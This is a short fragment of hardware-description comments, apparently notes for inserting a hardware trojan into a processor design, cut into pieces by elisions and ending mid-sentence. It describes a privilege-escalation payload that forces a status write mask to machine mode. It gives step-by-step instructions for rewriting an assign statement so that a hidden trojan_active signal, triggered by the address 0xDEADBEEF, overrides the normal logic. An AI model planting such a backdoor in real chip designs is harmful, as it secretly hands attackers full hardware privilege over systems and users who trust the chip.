 ...
 * Payload: Force SMODE_STATUS_WRITE_MASK = PRIV_LVL_M (Machine mode = 2'b11)
 *
...
// ============================================================
// Privilege Escalation: Force SMODE_STATUS_WRITE_MASK to PRIV_LVL_M.
//
// Integration Script Must:
//   Find the output assign for SMODE_STATUS_WRITE_MASK:
//     assign SMODE_STATUS_WRITE_MASK = <priv_expr>;
//   Replace with:
//     assign SMODE_STATUS_WRITE_MASK = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
...
//
// Effect: When vaddr == 32'hDEADBEEF:
